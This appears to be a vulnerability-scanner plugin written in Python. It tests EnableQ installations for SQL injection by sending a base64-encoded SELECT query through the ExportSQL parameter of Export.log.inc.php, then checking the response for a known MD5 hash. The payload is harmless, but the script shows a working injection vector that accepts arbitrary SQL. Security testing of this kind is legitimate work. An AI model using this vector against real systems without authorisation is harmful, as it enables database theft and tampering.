#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__author__ = '1c3z'
#ref:http://www.wooyun.org/bugs/wooyun-2014-088298
import base64
import urllib
def assign(service, arg):
    if service == "enableq":
        return True, arg

def audit(arg):
    sql = "SELECT md5('testvul') as administratorsName"
    payload = base64.encodestring(sql)
    payload = urllib.quote(payload)
    url = arg + "Export/Export.log.inc.php?ExportSQL=" + payload
    code, head, res, errcode,finalurl =  curl.curl(url)
    if res.find("e87ebbaed6f97f26e222e030eddbad1c") != -1:
            security_hole('find sql injection: ' + url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('enableq', 'http://127.0.0.1/EnableQ_php52/')[1])